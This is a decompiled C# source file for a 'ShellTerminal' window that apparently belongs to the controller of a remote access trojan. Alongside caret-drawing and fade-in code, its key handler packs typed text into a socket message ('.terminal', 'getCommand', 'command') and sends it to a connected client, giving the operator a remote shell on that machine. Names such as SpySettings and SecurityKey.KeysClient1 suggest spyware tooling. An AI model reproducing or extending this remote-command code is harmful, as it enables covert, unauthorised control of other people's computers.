using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x020000BF RID: 191
[DesignerGenerated]
public partial class ShellTerminal : Form
{
	// Token: 0x06000838 RID: 2104 RVA: 0x000C4DF4 File Offset: 0x000C2FF4
	public ShellTerminal()
	{
		base.Load += this.ShellTerminal_Load;
		this.Title = "null";
		this.rect = default(Rectangle);
		this.hidCareat = -1;
		this.CareatSize = new Size(6, 12);
		this.TAGx = "SHEEL:~$";
		this.ignore = false;
		this.IAMNew = true;
		this.InitializeComponent();
	}

	// Token: 0x0600083B RID: 2107 RVA: 0x000C5268 File Offset: 0x000C3468
	private void SpyStyle()
	{
		foreach (RichTextBox richTextBox in base.Controls.OfType<RichTextBox>())
		{
			richTextBox.ForeColor = SpySettings.DefaultColor_Foreground;
			richTextBox.BackColor = SpySettings.DefaultColor_Background;
		}
	}

	// Token: 0x0600083C RID: 2108 RVA: 0x000C52CC File Offset: 0x000C34CC
	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			this.TOpacity.Enabled = false;
		}
	}

	// Token: 0x0600083D RID: 2109 RVA: 0x000C5314 File Offset: 0x000C3514
	private void ShellTerminal_Load(object sender, EventArgs e)
	{
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\15.ico");
		this.OutText.Font = reso.f;
		Size size = TextRenderer.MeasureText("S", reso.f);
		this.CareatSize = new Size(checked((int)Math.Round((double)size.Width / 2.0)), size.Height);
		this.SpyStyle();
		this.Text = this.Title;
		this.OutText.ContextMenuStrip = this.ctxMenu;
		this.Color_Default = this.OutText.ForeColor;
		this.OutText.TabStop = false;
		this.TOpacity.Interval = SpySettings.T_Interval;
		this.TOpacity.Enabled = true;
		this.OutText.Focus();
		this.OutText.Select();
	}

	// Token: 0x0600083E RID: 2110 RVA: 0x000C53FC File Offset: 0x000C35FC
	private void CaretShell(int alva)
	{
		string text = this.OutText.Text;
		if (text.Length > 0)
		{
			if (!(this.rect == default(Rectangle)))
			{
				this.OutText.Invalidate(this.rect);
			}
			this.OutText.Update();
			Graphics graphics = this.OutText.CreateGraphics();
			Point positionFromCharIndex = this.OutText.GetPositionFromCharIndex(this.OutText.SelectionStart);
			this.rect = new Rectangle(positionFromCharIndex.X, positionFromCharIndex.Y, this.CareatSize.Width, this.CareatSize.Height);
			int alpha = (int)this.Color_Default.A;
			if (this.OutText.SelectionStart != text.Length)
			{
				alpha = alva;
			}
			graphics.FillRectangle(new Pen(Color.FromArgb(alpha, (int)this.Color_Default.R, (int)this.Color_Default.G, (int)this.Color_Default.B), (float)this.CareatSize.Width).Brush, this.rect);
			graphics.Dispose();
		}
	}

	// Token: 0x0600083F RID: 2111 RVA: 0x000C552C File Offset: 0x000C372C
	private void Caret_Tick(object sender, EventArgs e)
	{
		if (!this.ignore)
		{
			if (this.hidCareat == -1)
			{
				if (!(this.rect == default(Rectangle)))
				{
					this.OutText.Invalidate(this.rect);
				}
				this.hidCareat = 1;
			}
			else
			{
				this.CaretShell(128);
				this.hidCareat = -1;
			}
		}
	}

	// Token: 0x06000840 RID: 2112 RVA: 0x000C5594 File Offset: 0x000C3794
	private void OutText_TextChanged(object sender, EventArgs e)
	{
		if (!this.IAMNew && this.OutText.Text.Length == 0)
		{
			this.NewTag(false);
		}
		else if (!this.ignore)
		{
			this.RestCaret();
		}
	}

	// Token: 0x06000841 RID: 2113 RVA: 0x000C55DC File Offset: 0x000C37DC
	private void OutText_MouseClick(object sender, MouseEventArgs e)
	{
		if (!this.ignore)
		{
			this.RestCaret();
		}
	}

	// Token: 0x06000842 RID: 2114 RVA: 0x000C55FC File Offset: 0x000C37FC
	private void OutText_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.KeyData == Keys.Up | e.KeyData == Keys.Down | e.KeyData == Keys.Right | e.KeyData == Keys.Left)
		{
			e.SuppressKeyPress = true;
		}
		else if (Control.ModifierKeys == Keys.Shift | Control.ModifierKeys == Keys.Control)
		{
			e.SuppressKeyPress = true;
		}
		else if (!this.OutText.ReadOnly && !this.ignore)
		{
			if (e.KeyData == Keys.Return)
			{
				e.SuppressKeyPress = true;
				if (this.OutText.Lines.Length != 0)
				{
					string text = this.OutText.Lines[checked(this.OutText.Lines.Length - 1)];
					if (!text.Contains(this.TAGx))
					{
						this.NewTag(true);
						return;
					}
					text = text.Substring(this.TAGx.Length);
					if (text.Length == 0)
					{
						return;
					}
					if (this.classClient != null)
					{
						object[] parametersObjects = new object[]
						{
							this.Client,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient1,
								Data.SPL_SOCKET,
								reso.domen,
								".terminal",
								Data.SPL_SOCKET,
								"method",
								Data.SPL_SOCKET,
								SecurityKey.getCommand,
								Data.SPL_SOCKET,
								"command",
								Data.SPL_DATA,
								text
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.OutText.ReadOnly = true;
						this.ignore = true;
						if (!(this.rect == default(Rectangle)))
						{
							this.OutText.Invalidate(this.rect);
						}
						this.classClient.SendMessage(parametersObjects);
					}
				}
			}
			this.RestCaret();
		}
	}

	// Token: 0x06000843 RID: 2115 RVA: 0x000C5808 File Offset: 0x000C3A08
	public void NewTag(bool isLine)
	{
		this.OutText.DeselectAll();
		if (isLine)
		{
			RTB outText = this.OutText;
			outText.AppendText("\r\n" + this.TAGx);
		}
		else
		{
			RTB outText2 = this.OutText;
			outText2.AppendText(this.TAGx);
		}
		this.OutText.SelectionStart = this.OutText.Text.Length;
	}

	// Token: 0x06000844 RID: 2116 RVA: 0x000C5874 File Offset: 0x000C3A74
	private void RestCaret()
	{
		if (!this.ignore)
		{
			this.CaretShell(128);
			this.Caret.Enabled = false;
			this.Caret.Enabled = true;
		}
	}

	// Token: 0x06000845 RID: 2117 RVA: 0x000036A7 File Offset: 0x000018A7
	private void OutText_HScroll(object sender, EventArgs e)
	{
		this.OutText.Invalidate();
		this.CaretShell(255);
	}

	// Token: 0x06000846 RID: 2118 RVA: 0x000036A7 File Offset: 0x000018A7
	private void OutText_VScroll(object sender, EventArgs e)
	{
		this.OutText.Invalidate();
		this.CaretShell(255);
	}

	// Token: 0x06000847 RID: 2119 RVA: 0x000C58B0 File Offset: 0x000C3AB0
	private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (!this.OutText.ReadOnly)
		{
			this.OutText.Paste();
		}
	}

	// Token: 0x06000848 RID: 2120 RVA: 0x000036BF File Offset: 0x000018BF
	private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
	{
		this.OutText.Copy();
	}

	// Token: 0x04000C1E RID: 3102
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("OutText")]
	private RTB _OutText;

	// Token: 0x04000C1F RID: 3103
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Caret")]
	private Timer _Caret;

	// Token: 0x04000C20 RID: 3104
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private Timer _TOpacity;

	// Token: 0x04000C21 RID: 3105
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CopyToolStripMenuItem")]
	private ToolStripMenuItem _CopyToolStripMenuItem;

	// Token: 0x04000C22 RID: 3106
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PasteToolStripMenuItem")]
	private ToolStripMenuItem _PasteToolStripMenuItem;

	// Token: 0x04000C23 RID: 3107
	public TcpClient Client;

	// Token: 0x04000C24 RID: 3108
	public Client classClient;

	// Token: 0x04000C25 RID: 3109
	public string Title;

	// Token: 0x04000C26 RID: 3110
	public Color Color_Default;

	// Token: 0x04000C27 RID: 3111
	private Rectangle rect;

	// Token: 0x04000C28 RID: 3112
	private int hidCareat;

	// Token: 0x04000C29 RID: 3113
	private Size CareatSize;

	// Token: 0x04000C2A RID: 3114
	private string TAGx;

	// Token: 0x04000C2B RID: 3115
	public bool ignore;

	// Token: 0x04000C2C RID: 3116
	public bool IAMNew;
}
